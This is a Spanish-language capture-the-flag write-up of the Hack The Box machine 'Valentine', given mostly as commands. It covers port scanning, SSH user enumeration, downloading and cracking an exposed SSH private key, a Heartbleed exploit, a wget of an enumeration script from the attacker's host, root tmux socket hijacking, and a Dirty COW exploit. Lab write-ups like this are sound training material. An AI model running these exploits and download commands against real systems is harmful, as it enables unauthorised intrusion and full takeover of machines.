# Valentine

IP: 10.10.10.79

ping -c 1 10.10.10.79                                    
PING 10.10.10.79 (10.10.10.79) 56(84) bytes of data.       
64 bytes from 10.10.10.79: icmp_seq=1 ttl=63 time=116 ms     
                                                            
--- 10.10.10.79 ping statistics ---                          
1 packets transmitted, 1 received, 0% packet loss, time 0ms  
rtt min/avg/max/mdev = 116.271/116.271/116.271/0.000 ms 

### TTL OS
*nix(Linux/Unix)    64
Windows             128
Solaris             254

## Escaneo
nmap -p- --open -T5 -v -n 10.10.10.79 -oN allPorts

Abrimos la web por http y https
Vemos el certificado

nmap -sC -sV -p22,80,443 10.10.10.79 -oN targetedPorts

wfuzz -c --hc=404 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt http://10.10.10.79/FUZZ

nmap --script http-enum -p80 10.10.10.79 -oN webScan
entramos en 10.10.10.79/dev/

## Exploit 
cd exploit
searchsploit ssh enum
searchsploit -m exploits/linux/remote/45233.py
python 45233.py
pip install cryptography==2.4.2.
python 45233.py --username root 10.10.10.79
python 45233.py --username hype 10.10.10.79


## Hype Key
curl -k https://10.10.10.79/dev/hype_key
curl -k https://10.10.10.79/dev/hype_key | tr -d ' '
curl -k -s https://10.10.10.79/dev/hype_key | tr -d ' '
curl -k -s https://10.10.10.79/dev/hype_key | tr -d ' ' | xxd -ps -r
curl -k -s https://10.10.10.79/dev/hype_key | tr -d ' ' | xxd -ps -r > ../content/id_rsa
cd ../content
chmod 600 id_rsa
ssh -i id_rsa hype@10.10.10.79

### Crack Key pass
locate ssh2john
/usr/share/john/ssh2john.py id_rsa
/usr/share/john/ssh2john.py id_rsa > ~/htb/valentine/content/hash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash_key 
john --show hash
locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u

nmap --script "vuln and safe" -p443 10.10.10.79 -oN webVulnScan
sslyze --heartbleed 10.10.10.79:443
sslscan 10.10.10.79:443

google--> heartbleed exploit github
wget raw_exploit.py
python heartbleed.py -n 100 -p 443 10.10.10.79
echo "Text==" | base64 -d
ssh -i id_rsa hype@10.10.10.79
password = echo
whoami
pwd
cd Desktop
cat user.txt
sudo su -

## Escala de privilegios Tmux Opcion 1
uname -a --> 32 bits
lsb-release -a --> ubuntu muy antiguo
linux-smart-enumeration github
git clone repositorio
cd linux-smart
python -m SimpleHTTPServer

Desde la victima --> wget http://10.10.14.23:8000/lse.sh
chmod +x lse.sh
./lse.sh
./lse.sh -l 1

dev-sess --> ls -l 
type dev_sess --> socket file --> google: socket file escalating privilegios
tmux -S dev_sess
whoami
cd /root/
ls
cat curl.sh

## Escalada de privlegios Kernel Opcion 2
dirty cow /etc/passwd 2.6-3.9
copiamos el raw
nano dirty.c --> pegamos --> cambiamos user.username
cat dirty.c | grep gcc
compilamos
cat /etc/passwd
./dirty
su yintao
whoami
id
cd /root/
ls
hash_identifier
hashid

python -c 'import crypt; print crypt.crypt("hola", "salted")'


